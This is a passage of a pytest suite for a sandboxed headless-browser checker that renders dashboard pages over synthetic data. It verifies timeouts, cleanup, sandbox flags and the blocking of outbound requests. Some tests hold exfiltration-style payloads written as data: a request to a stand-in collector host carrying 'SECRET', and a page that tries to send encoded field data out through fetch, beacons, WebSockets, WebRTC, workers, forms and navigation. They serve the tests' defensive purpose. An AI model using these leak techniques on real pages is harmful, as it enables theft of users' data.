    assert v.status == STATUS_SKIPPED
    assert "no system-installed Python" in v.reason


def test_a_host_that_is_not_linux_skips_before_looking_for_a_browser(monkeypatch):
    monkeypatch.setattr(platform_compat, "IS_LINUX", False)
    monkeypatch.setattr(
        dashboard_verify, "find_browser", lambda: pytest.fail("looked for a browser")
    )

    v = dashboard_verify.verify_page("<p>x</p>", _read())

    assert v.status == STATUS_SKIPPED and "Linux only" in v.reason


@LINUX_ONLY
def test_a_document_too_large_to_carry_is_skipped(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/bin/true")
    monkeypatch.setattr(dashboard_verify, "_MAX_DOCUMENT_BYTES", 10)

    v = dashboard_verify.verify_page("<p>x</p>", _read())

    assert v.status == STATUS_SKIPPED and "too large" in v.reason


@LINUX_ONLY
def test_a_check_that_blows_up_is_skipped_and_never_raises(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/bin/true")

    def boom(*_a: Any, **_k: Any):
        raise RuntimeError("unexpected")

    monkeypatch.setattr(dashboard_verify, "_drive", boom)

    v = dashboard_verify.verify_page("<p>x</p>", _read())

    assert v.status == STATUS_SKIPPED
    assert "unexpected" not in v.reason, "an internal error text reached the agent"


@LINUX_ONLY
def test_a_check_that_finds_the_slot_taken_is_busy_at_once_and_reads_nothing(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/bin/true")
    reads: list[int] = []

    def read() -> dict[str, Any]:
        reads.append(1)
        return _read()

    assert dashboard_verify._SLOT.acquire(blocking=False)
    try:
        v = dashboard_verify.verify_page("<p>x</p>", read)
    finally:
        dashboard_verify._SLOT.release()

    assert v.status == STATUS_SKIPPED and v.reason.startswith("busy")
    assert reads == [], "a check that was turned away read the record"
    assert dashboard_verify.preflight() == ""


@LINUX_ONLY
def test_a_machine_short_of_memory_is_skipped_before_the_record_is_read(monkeypatch):
    monkeypatch.setattr(platform_compat, "host_available_mib", lambda: 300)
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/bin/true")

    def read() -> dict[str, Any]:
        raise AssertionError("the record was read")

    v = dashboard_verify.verify_page("<p>x</p>", read)

    assert v.status == STATUS_SKIPPED
    assert "short of memory" in v.reason and "300 MiB" in v.reason
    assert dashboard_verify.preflight() == v.reason


@LINUX_ONLY
def test_a_host_whose_memory_cannot_be_read_is_not_held_back(monkeypatch, tmp_path, fast):
    monkeypatch.setattr(platform_compat, "host_available_mib", lambda: 0)

    v = _run(monkeypatch, FakeBrowser(tmp_path), "<p>x</p>")

    assert v.status == STATUS_PASSED


def test_preflight_names_each_reason_a_check_cannot_start(monkeypatch):
    monkeypatch.setattr(platform_compat, "IS_LINUX", False)
    assert "Linux only" in dashboard_verify.preflight()

    monkeypatch.setattr(platform_compat, "IS_LINUX", True)
    assert dashboard_verify.preflight() == ""
    monkeypatch.setattr(platform_compat, "host_available_mib", lambda: 1)
    assert "short of memory" in dashboard_verify.preflight()


@LINUX_ONLY
def test_a_record_that_cannot_be_read_is_a_skip_and_frees_the_slot(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/bin/true")

    def broken() -> dict[str, Any]:
        raise OSError("fold unreadable")

    v = dashboard_verify.verify_page("<p>x</p>", broken)

    assert v.status == STATUS_SKIPPED and "could not be read" in v.reason
    assert not dashboard_verify._SLOT.locked()


@LINUX_ONLY
def test_a_record_too_large_to_copy_is_a_skip_and_starts_no_browser(monkeypatch, tmp_path, fast):
    monkeypatch.setattr(dashboard_synth, "MAX_NODES", 3)
    fake = FakeBrowser(tmp_path)

    v = _run(monkeypatch, fake, "<p>x</p>")

    assert v.status == STATUS_SKIPPED and "could not be copied" in v.reason
    assert fake.records("start") == []
    assert not dashboard_verify._SLOT.locked()


@LINUX_ONLY
def test_a_check_with_no_time_left_starts_no_browser(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(tmp_path)

    v = _run(monkeypatch, fake, "<p>x</p>", deadline=time.monotonic() - 1)

    assert v.status == STATUS_TIMED_OUT
    assert fake.records("start") == []
    assert not dashboard_verify._SLOT.locked()


@LINUX_ONLY
def test_a_browser_that_failed_to_start_is_not_started_again(monkeypatch):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/opt/chrome")
    monkeypatch.setattr(dashboard_verify, "_UNUSABLE", {})
    calls: list[str] = []

    def drive(_python: str, browser: str, *_a: Any):
        calls.append(browser)
        raise dashboard_verify._BrowserGone("no usable sandbox", failed_to_start=True)

    monkeypatch.setattr(dashboard_verify, "_drive", drive)

    first = dashboard_verify.verify_page("<p>x</p>", _read())
    second = dashboard_verify.verify_page("<p>x</p>", _read())

    assert first.status == second.status == STATUS_SKIPPED
    assert "no usable sandbox" in second.reason
    assert calls == ["/opt/chrome"], "a host that cannot run the browser paid the wait twice"


@LINUX_ONLY
def test_a_browser_that_died_mid_run_is_tried_again_next_time(monkeypatch):
    """One page that crashes the browser must not switch the check off for everybody."""
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: "/opt/chrome")
    monkeypatch.setattr(dashboard_verify, "_UNUSABLE", {})
    calls: list[str] = []

    def drive(_python: str, browser: str, *_a: Any):
        calls.append(browser)
        raise dashboard_verify._BrowserGone("went away", failed_to_start=False)

    monkeypatch.setattr(dashboard_verify, "_drive", drive)

    dashboard_verify.verify_page("<p>x</p>", _read())
    dashboard_verify.verify_page("<p>x</p>", _read())

    assert len(calls) == 2


def test_an_exit_message_loses_its_paths_and_its_log_prefix():
    assert dashboard_verify._path_free("cannot open /home/someone/.cache/x/lib.so: not found") == (
        "cannot open lib.so: not found"
    )


# --------------------------------------------------------------------------- #
# 6. The whole pipeline, against a fake browser
# --------------------------------------------------------------------------- #


@pytest.fixture
def fast(monkeypatch, tmp_path):
    """A short settle, a private temp root, a fixed generator for the copy and no memory of
    an earlier run."""
    monkeypatch.setattr(dashboard_verify, "_SETTLE_SECONDS", 0.2)
    monkeypatch.setattr(dashboard_verify, "_UNUSABLE", {})
    monkeypatch.setattr(dashboard_synth, "_fresh_rng", lambda: random.Random(SEED))
    temp_root = tmp_path / "tmp"
    temp_root.mkdir()
    monkeypatch.setattr(tempfile, "tempdir", str(temp_root))
    return temp_root


def _run(monkeypatch, fake: FakeBrowser, page: str, read: dict[str, Any] | None = None, **kw: Any):
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: str(fake.executable))
    return dashboard_verify.verify_page(page, read or _read(), **kw)


@LINUX_ONLY
def test_a_throwing_page_is_reported_with_the_line_it_was_thrown_on(monkeypatch, tmp_path, fast):
    page = "<div>x</div>\n<script>\n  var rows = window.kirocrew.fields.ratio;\n  rows.map(String);\n</script>"
    fake = FakeBrowser(
        tmp_path,
        events=[
            {
                "type": "exception",
                "find": "rows.map",
                "description": "TypeError: rows.map is not a function",
            }
        ],
    )

    v = _run(monkeypatch, fake, page)

    assert v.status == STATUS_FAILED
    assert [(e.kind, e.message, e.line, e.column) for e in v.errors] == [
        ("exception", "TypeError: rows.map is not a function", 4, 3)
    ]


@LINUX_ONLY
def test_a_clean_page_passes(monkeypatch, tmp_path, fast):
    v = _run(monkeypatch, FakeBrowser(tmp_path), "<p>fine</p>")

    assert v.status == STATUS_PASSED and v.errors == () and v.notes == ()


@LINUX_ONLY
def test_the_browser_is_given_the_frames_document_over_a_copy_of_the_read(
    monkeypatch, tmp_path, fast
):
    """Same compose path and policy; the values are invented and none is the record's."""
    fake = FakeBrowser(tmp_path)
    page = '<span data-dashboard-field="headline"></span>'
    read = dashboard_frame.read_payload(
        {"open_prs": 4821, "headline": "SENTINEL-VALUE-42 quarterly ledger"}, seq=914827
    )

    v = _run(monkeypatch, fake, page, read)

    (served,) = fake.records("fulfill")
    document = served["document"]
    assert document == dashboard_frame.compose(page, _synthetic(read, page=page))
    assert dashboard_frame.FRAME_CSP in document
    assert "SENTINEL-VALUE-42" not in document and "quarterly ledger" not in document
    assert "4821" not in document and "914827" not in document
    assert v.status == STATUS_PASSED and v.data == "synthetic"
    headers = {h["name"].lower(): h["value"] for h in served["headers"]}
    assert headers["content-security-policy"] == "sandbox allow-scripts"
    assert headers["content-type"].startswith("text/html")


@LINUX_ONLY
def test_the_browser_is_given_the_keys_the_page_names_and_none_of_the_others(
    monkeypatch, tmp_path, fast
):
    fake = FakeBrowser(tmp_path)
    page = "<script>window.kirocrew.fields.rows.map(function (r) { return r.title; });</script>"
    read = dashboard_frame.read_payload(
        {"rows": [{"title": "Alpha plan", "client_name": "Initech", "Fire Alice": 3}]}, seq=1
    )

    _run(monkeypatch, fake, page, read)

    (served,) = fake.records("fulfill")
    document = served["document"]
    assert '"title"' in document
    assert "client_name" not in document and "Fire Alice" not in document
    assert "Initech" not in document and "Alpha plan" not in document


@LINUX_ONLY
def test_the_browser_is_never_handed_a_value_of_the_record(monkeypatch, tmp_path, fast):
    """Every value the record holds, checked against everything the browser received."""
    fake = FakeBrowser(tmp_path)
    secrets = ["ZXQ-LEDGER-7781", "it_5e1d9c0b", "https://intranet.example.test/secret-path"]
    read = dashboard_frame.read_payload(
        {"title": secrets[0], "who": secrets[1], "link": secrets[2], "n": 90817}, seq=3
    )

    _run(monkeypatch, fake, "<p>x</p>", read)

    everything = (tmp_path / "received.jsonl").read_text()
    for secret in [*secrets, "90817"]:
        assert secret not in everything, secret


@LINUX_ONLY
def test_a_page_larger_than_a_pipe_buffer_arrives_whole(monkeypatch, tmp_path, fast):
    """The document goes through the pipe in one command; a partial write must resume."""
    page = "<p>" + "0123456789abcdef" * 150_000 + "</p>"
    fake = FakeBrowser(tmp_path)

    v = _run(monkeypatch, fake, page, timeout=20)

    assert v.status == STATUS_PASSED
    (served,) = fake.records("fulfill")
    assert served["document"] == dashboard_frame.compose(page, _synthetic(_read()))


@LINUX_ONLY
def test_every_request_but_the_page_is_refused(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(
        tmp_path,
        events=[
            {"type": "request", "id": "r1", "url": "https://cdn.jsdelivr.net/npm/chart.js@4"},
            {"type": "request", "id": "r2", "url": "https://collector.test/p?d=SECRET"},
        ],
    )

    v = _run(monkeypatch, fake, "<p>x</p>")

    refused = [
        row["params"] for row in fake.records("command") if row["method"] == "Fetch.failRequest"
    ]
    assert [(p["requestId"], p["errorReason"]) for p in refused] == [
        ("r1", "BlockedByClient"),
        ("r2", "BlockedByClient"),
    ]
    assert "chart.js@4" in v.notes[0] and "SECRET" not in v.notes[0]
    assert v.status == STATUS_PASSED, "a refused request is this run's doing, not the page's error"


_LIBRARY = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>'
_LIBRARY_REQUEST = {
    "type": "request",
    "id": "lib",
    "url": "https://cdn.jsdelivr.net/npm/chart.js@4",
}


@LINUX_ONLY
def test_a_library_page_whose_own_code_throws_on_the_data_is_still_failed(
    monkeypatch, tmp_path, fast
):
    """The library is not fetched, and the page's data bug is reported all the same."""
    page = (
        f"{_LIBRARY}\n<script>\n  var rows = window.kirocrew.fields.ratio;\n"
        "  rows.map(String);\n  new Chart(document.body, {});\n</script>"
    )
    fake = FakeBrowser(
        tmp_path,
        events=[
            _LIBRARY_REQUEST,
            {
                "type": "exception",
                "find": "rows.map",
                "description": "TypeError: rows.map is not a function",
            },
        ],
    )

    v = _run(monkeypatch, fake, page)

    assert v.status == STATUS_FAILED
    assert [(e.message, e.line) for e in v.errors] == [("TypeError: rows.map is not a function", 4)]
    assert "chart.js@4" in v.notes[0]


@LINUX_ONLY
def test_a_library_page_that_stops_at_the_library_is_skipped_with_the_name(
    monkeypatch, tmp_path, fast
):
    page = f"{_LIBRARY}\n<script>\n  new Chart(document.body, {{}});\n</script>"
    fake = FakeBrowser(
        tmp_path,
        events=[
            _LIBRARY_REQUEST,
            {
                "type": "exception",
                "find": "new Chart",
                "description": "ReferenceError: Chart is not defined",
            },
        ],
    )

    v = _run(monkeypatch, fake, page)

    assert v.status == STATUS_SKIPPED and v.errors == ()
    assert "'Chart is not defined'" in v.reason
    assert "chart.js@4" in v.notes[0]


@LINUX_ONLY
def test_the_browser_is_started_without_a_port_and_with_its_sandbox_on(monkeypatch, tmp_path, fast):
    monkeypatch.setenv("KIROCREW_TEST_SECRET", "must-not-reach-the-browser")
    fake = FakeBrowser(tmp_path)

    _run(monkeypatch, fake, "<p>x</p>")

    (start,) = fake.records("start")
    argv = start["argv"]
    assert "--remote-debugging-pipe" in argv
    assert not [a for a in argv if a.startswith("--remote-debugging-port")]
    assert "--no-sandbox" not in argv and "--disable-setuid-sandbox" not in argv
    assert "--host-resolver-rules=MAP * ~NOTFOUND" in argv
    assert "--proxy-server=http://127.0.0.1:9" in argv
    assert "--proxy-bypass-list=<-loopback>" in argv
    assert any(a.startswith("--force-webrtc-ip-handling-policy=") for a in argv)
    profile = next(a.split("=", 1)[1] for a in argv if a.startswith("--user-data-dir="))
    assert profile.startswith(str(fast)), "the profile was not made in the temp root"
    # What it inherited: a scrubbed environment and no descriptor but the pipe.
    assert "KIROCREW_TEST_SECRET" not in start["env"]
    assert start["env"]["HOME"] == profile
    assert start["leaked_fds"] == []


@LINUX_ONLY
def test_the_browser_and_its_profile_are_gone_afterwards(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(tmp_path)

    _run(monkeypatch, fake, "<p>x</p>")

    (start,) = fake.records("start")
    with pytest.raises(ProcessLookupError):
        os.kill(start["pid"], 0)
    assert list(fast.iterdir()) == [], "the throwaway profile was left behind"


class _MovableClock:
    """The runner's clock, with a hand a test can turn.

    A limit is then passed when the test turns the hand, after the browser has done what
    the test needs it to have done, and not when a timer happens to run out first.
    """

    def __init__(self) -> None:
        self.skew = 0.0

    def monotonic(self) -> float:
        return time.monotonic() + self.skew

    def __getattr__(self, name: str) -> Any:
        return getattr(time, name)


def _run_until_the_limit_passes(
    monkeypatch: pytest.MonkeyPatch,
    fake: FakeBrowser,
    page: str,
    reached: Any,
) -> dashboard_verify.Verification:
    """Run a check with an hour to spare, wait until ``reached()`` says the browser is where
    the test wants it, then pass the limit and wake the runner so that it looks."""
    clock = _MovableClock()
    monkeypatch.setattr(dashboard_verify, "time", clock)
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: str(fake.executable))
    out: list[dashboard_verify.Verification] = []
    worker = threading.Thread(
        target=lambda: out.append(dashboard_verify.verify_page(page, _read(), timeout=3600))
    )
    worker.start()
    try:
        wait_until(
            reached, describe=lambda: f"the browser never got there: {fake.records('start')}"
        )
    finally:
        clock.skew += 7200
        fake.poke()
        wait_until(lambda: not worker.is_alive())
    return out[0]


@LINUX_ONLY
def test_a_page_that_never_loads_is_stopped_at_the_limit_and_timed_out(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(tmp_path, load=False)
    navigated = threading.Event()
    original = _Collector.on_event

    def spy(self, method, params):
        original(self, method, params)
        if method == "Page.frameNavigated":
            navigated.set()

    monkeypatch.setattr(_Collector, "on_event", spy)

    v = _run_until_the_limit_passes(
        monkeypatch, fake, "<script>while (true) {}</script>", navigated.is_set
    )

    assert v.status == STATUS_TIMED_OUT and v.data == "synthetic"
    assert [e.kind for e in v.errors] == ["timeout"], "the page document had started"
    assert "limit" in v.reason
    (start,) = fake.records("start")
    with pytest.raises(ProcessLookupError):
        os.kill(start["pid"], 0)
    assert list(fast.iterdir()) == [], "the throwaway profile was left behind"
    assert not dashboard_verify._SLOT.locked()


@LINUX_ONLY
def test_a_page_the_browser_holds_past_the_limit_has_its_process_group_killed(
    monkeypatch, tmp_path, fast
):
    """The browser answers nothing more after the document is served and is killed."""
    fake = FakeBrowser(tmp_path, hold=True)

    v = _run_until_the_limit_passes(
        monkeypatch, fake, "<p>x</p>", lambda: len(fake.records("fulfill")) == 1
    )

    assert v.status == STATUS_TIMED_OUT and v.errors == ()
    (start,) = fake.records("start")
    with pytest.raises(ProcessLookupError):
        os.kill(start["pid"], 0)


@LINUX_ONLY
def test_a_read_that_outlasts_the_limit_starts_no_browser(monkeypatch, tmp_path, fast):
    """The read of the record cannot be interrupted; once it is over, a check that has no
    time left does not start a browser."""
    fake = FakeBrowser(tmp_path)
    clock = _MovableClock()
    monkeypatch.setattr(dashboard_verify, "time", clock)
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: str(fake.executable))

    def slow_read() -> dict[str, Any]:
        clock.skew += 7200
        return _read()

    v = dashboard_verify.verify_page("<p>x</p>", slow_read, timeout=60)

    assert v.status == STATUS_TIMED_OUT and v.data == "synthetic"
    assert "reading the record" in v.reason
    assert fake.records("start") == []
    assert not dashboard_verify._SLOT.locked()


@LINUX_ONLY
def test_a_message_too_large_to_inspect_fails_the_page_instead_of_passing_it(
    monkeypatch, tmp_path, fast
):
    """An error the check could not read must not read as no error."""
    monkeypatch.setattr(dashboard_verify, "_MAX_MESSAGE_BYTES", 50_000)
    fake = FakeBrowser(tmp_path, events=[{"type": "huge", "bytes": 300_000}])

    v = _run(monkeypatch, fake, "<p>x</p>")

    assert v.status == STATUS_FAILED
    assert [e.kind for e in v.errors] == ["oversize"]
    assert "not inspected" in v.errors[0].message


@LINUX_ONLY
def test_a_crashed_tab_is_reported(monkeypatch, tmp_path, fast):
    v = _run(monkeypatch, FakeBrowser(tmp_path, events=[{"type": "crash"}], load=False), "<p>x</p>")

    assert v.status == STATUS_FAILED
    assert [e.kind for e in v.errors] == ["crash"]


@LINUX_ONLY
def test_a_load_that_arrives_before_the_navigation_reply_still_counts(monkeypatch, tmp_path, fast):
    """The two travel on separate channels; either order is a loaded page and not a timeout."""
    v = _run(monkeypatch, FakeBrowser(tmp_path, load_first=True), "<p>fine</p>")

    assert v.status == STATUS_PASSED and v.errors == ()


@LINUX_ONLY
def test_the_browser_starts_in_its_own_profile_directory(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(tmp_path)

    _run(monkeypatch, fake, "<p>x</p>")

    (start,) = fake.records("start")
    profile = next(a.split("=", 1)[1] for a in start["argv"] if a.startswith("--user-data-dir="))
    assert os.path.realpath(start["cwd"]) == os.path.realpath(profile)


def _alive(pid: int) -> bool:
    try:
        stat = Path(f"/proc/{pid}/stat").read_text()
    except OSError:
        return False
    return stat.rsplit(")", 1)[1].split()[0] != "Z"


@LINUX_ONLY
def test_a_child_left_by_a_browser_that_died_is_killed_with_its_group(monkeypatch, tmp_path, fast):
    """The browser's main process is gone and its child still holds the page's data."""
    fake = FakeBrowser(tmp_path, mode="exit_leaving_child", exit_message="[1:2:FATAL:x] boom")

    v = _run(monkeypatch, fake, "<p>x</p>")

    assert v.status == STATUS_SKIPPED and "boom" in v.reason
    (child,) = fake.records("child")
    wait_until(
        lambda: not _alive(child["pid"]),
        describe=lambda: f"a process of the browser's (pid {child['pid']}) outlived the check",
    )


def test_a_save_never_waits_on_the_check_past_a_bound_inside_what_the_tool_waits():
    """The tool waits 30 seconds for a gateway reply (the default of ``mcp_core._post``,
    which ``dashboard_save`` does not override); a check is waited on for far less."""
    assert dashboard_verify.REPLY_SECONDS == (
        dashboard_verify.RUN_TIMEOUT_SECONDS
        + dashboard_verify._EXIT_WAIT_SECONDS
        + dashboard_verify._REAP_SECONDS
        + 1.0
    )
    assert dashboard_verify.REPLY_SECONDS < 30


@LINUX_ONLY
def test_a_browser_that_cannot_start_its_sandbox_is_skipped_once_and_remembered(
    monkeypatch, tmp_path, fast
):
    fake = FakeBrowser(
        tmp_path,
        mode="exit_at_start",
        exit_message="[1:2:FATAL:zygote_host_impl_linux.cc:130] No usable sandbox! See /usr/share/doc/x",
    )

    first = _run(monkeypatch, fake, "<p>x</p>")
    second = _run(monkeypatch, fake, "<p>x</p>")

    assert first.status == STATUS_SKIPPED
    assert "sandbox" in first.reason and "does not turn the sandbox off" in first.reason
    assert "/usr/share" not in first.reason
    assert second.status == STATUS_SKIPPED and second.reason == first.reason
    assert len(fake.records("start")) == 1, "the second save started the browser again"


@LINUX_ONLY
def test_two_checks_at_once_start_one_browser(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(tmp_path, hold=True)
    monkeypatch.setattr(dashboard_verify, "find_browser", lambda: str(fake.executable))
    first: list[dashboard_verify.Verification] = []
    # The test releases the browser, so no real limit may end the check before it does.
    worker = threading.Thread(
        target=lambda: first.append(dashboard_verify.verify_page("<p>x</p>", _read(), timeout=3600))
    )
    worker.start()
    try:
        # The browser has the page and is holding it: a check is running.
        wait_until(lambda: len(fake.records("fulfill")) == 1)
        second = dashboard_verify.verify_page("<p>y</p>", _read())
        assert second.status == STATUS_SKIPPED and second.reason.startswith("busy")
        assert len(fake.records("start")) == 1, "the second check started a browser"
    finally:
        fake.release()
        wait_until(lambda: not worker.is_alive())

    assert first[0].status == STATUS_PASSED
    assert not dashboard_verify._SLOT.locked()


@LINUX_ONLY
def test_a_browser_that_never_answers_is_killed_and_timed_out(monkeypatch, tmp_path, fast):
    fake = FakeBrowser(tmp_path, mode="hang")

    v = _run_until_the_limit_passes(
        monkeypatch, fake, "<p>x</p>", lambda: len(fake.records("start")) == 1
    )

    assert v.status == STATUS_TIMED_OUT and "limit" in v.reason
    (start,) = fake.records("start")
    with pytest.raises(ProcessLookupError):
        os.kill(start["pid"], 0)
    assert dashboard_verify._UNUSABLE == {}, "a slow browser was written off for good"


# --------------------------------------------------------------------------- #
# 7. A real browser
# --------------------------------------------------------------------------- #

_CLEAN = (
    '<div data-dashboard-field="open_prs"></div>\n'
    "<script>window.kirocrew.subscribe('open_prs', function (v) { document.title = String(v); });</script>"
)


@pytest.fixture(scope="module")
def real_browser():
    """Skip unless this host has a Chromium that can start its sandbox."""
    if not platform_compat.IS_LINUX:
        pytest.skip("the page check runs on Linux only")
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(dashboard_verify, "find_launcher_python", lambda: sys.executable)
        probe = dashboard_verify.verify_page(_CLEAN, _read())
    if probe.status != STATUS_PASSED:
        # Installed and unable to run a plain page (a container without the sandbox's
        # namespaces, a start that hangs) is skipped or timed out, and is not a browser.
        pytest.skip(f"no usable browser here: {probe.status}: {probe.reason or probe.errors}")
    yield


def _ran(v: dashboard_verify.Verification) -> dashboard_verify.Verification:
    """*v*, or a skip when it says this host's browser did not run the page.

    The fixture's plain page ran, and a later start can still fail on a host whose browser
    is unreliable. That is the host's doing, and the tests below say nothing about it.
    """
    if v.status == STATUS_TIMED_OUT or (
        v.status == STATUS_SKIPPED and v.reason.startswith("the browser could not")
    ):
        pytest.skip(f"no usable browser here: {v.status}: {v.reason}")
    return v


def test_a_real_page_that_throws_on_its_data_is_reported_with_its_line(real_browser):
    page = "<p>data</p>\n<script>\n  var rows = window.kirocrew.fields.ratio;\n  rows.map(String);\n</script>"
    read = dashboard_frame.read_payload({"ratio": "n/a"}, seq=1)

    v = _ran(dashboard_verify.verify_page(page, read))

    assert v.status == STATUS_FAILED
    assert [(e.kind, e.line) for e in v.errors] == [("exception", 4)]
    assert "rows.map is not a function" in v.errors[0].message


def test_a_real_page_that_crashes_only_on_a_null_field_crashes_on_the_copy_too(real_browser):
    """The copy keeps a null a null, so what the record's null breaks, the copy's breaks.

    The control is the same page over a field that has a number: it passes, so the failure
    is the null's and not the page's.
    """
    page = "<p>data</p>\n<script>\n  var x = window.kirocrew.fields.x;\n  x.toFixed(1);\n</script>"

    empty = _ran(
        dashboard_verify.verify_page(page, dashboard_frame.read_payload({"x": None}, seq=1))
    )
    filled = _ran(
        dashboard_verify.verify_page(page, dashboard_frame.read_payload({"x": 3.5}, seq=1))
    )

    assert empty.status == STATUS_FAILED and empty.data == "synthetic"
    assert [(e.kind, e.line) for e in empty.errors] == [("exception", 4)]
    assert "toFixed" in empty.errors[0].message
    assert filled.status == STATUS_PASSED and filled.errors == ()


def test_a_real_library_page_whose_own_code_throws_on_its_data_is_still_failed(real_browser):
    """Chart.js is not fetched here; the page's own error on the record is still found."""
    page = (
        '<script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>\n<script>\n'
        "  var rows = window.kirocrew.fields.ratio;\n  rows.map(String);\n"
        "  new Chart(document.body, {});\n</script>"
    )
    read = dashboard_frame.read_payload({"ratio": "n/a"}, seq=1)

    v = _ran(dashboard_verify.verify_page(page, read))

    assert v.status == STATUS_FAILED
    assert [(e.kind, e.line) for e in v.errors] == [("exception", 4)]
    assert "rows.map is not a function" in v.errors[0].message
    assert "chart.js@4" in v.notes[0]


def test_a_real_library_page_that_stops_at_the_library_is_skipped_and_says_why(real_browser):
    page = (
        '<script src="https://cdn.jsdelivr.net/npm/chart.js@4"></script>\n<script>\n'
        "  new Chart(document.body, {});\n</script>"
    )

    v = _ran(dashboard_verify.verify_page(page, _read()))

    assert v.status == STATUS_SKIPPED and v.errors == ()
    assert "'Chart is not defined'" in v.reason


def test_a_real_page_that_renders_cleanly_passes(real_browser):
    v = _ran(dashboard_verify.verify_page(_CLEAN, _read()))

    assert v.status == STATUS_PASSED and v.errors == ()
    # The only wait a clean page pays beyond the browser's own start.
    assert dashboard_verify._SETTLE_SECONDS <= 1.0


def test_a_real_page_cannot_reach_a_listener_on_this_machine(real_browser):
    """Every way out the page can try, against a loopback listener that must stay silent."""
    server = socket.socket()
    server.bind(("127.0.0.1", 0))
    server.listen(64)
    server.setblocking(False)

    def connections() -> int:
        seen = 0
        while True:
            try:
                conn, _ = server.accept()
            except BlockingIOError:
                return seen
            conn.close()
            seen += 1

    try:
        # The counter itself works: one plain connect is seen.
        socket.create_connection(server.getsockname(), timeout=2).close()
        assert connections() == 1

        origin = f"http://127.0.0.1:{server.getsockname()[1]}"
        page = textwrap.dedent(f"""\
            <link rel="preconnect" href="{origin}">
            <link rel="stylesheet" href="{origin}/s.css">
            <script src="{origin}/x.js"></script>
            <img src="{origin}/i.png">
            <form id="f" action="{origin}/form" method="post"></form>
            <script>
              var d = encodeURIComponent(JSON.stringify(window.kirocrew.fields));
              fetch('{origin}/fetch?d=' + d).catch(function () {{}});
              new Image().src = '{origin}/img?d=' + d;
              navigator.sendBeacon('{origin}/beacon', d);
              try {{ new WebSocket('ws://127.0.0.1:{server.getsockname()[1]}/ws'); }} catch (e) {{}}
              try {{ new RTCPeerConnection({{iceServers: [{{urls: 'turn:127.0.0.1:{server.getsockname()[1]}'}}]}}); }} catch (e) {{}}
              try {{ new Worker(URL.createObjectURL(new Blob(["fetch('{origin}/worker')"]))); }} catch (e) {{}}
              document.getElementById('f').submit();
              setTimeout(function () {{ location.href = '{origin}/nav?d=' + d; }}, 0);
            </script>
            """)

        v = _ran(dashboard_verify.verify_page(page, _read()))

        assert connections() == 0, "the page reached a listener on this machine"
        assert v.status in (STATUS_FAILED, STATUS_PASSED)
    finally:
        server.close()
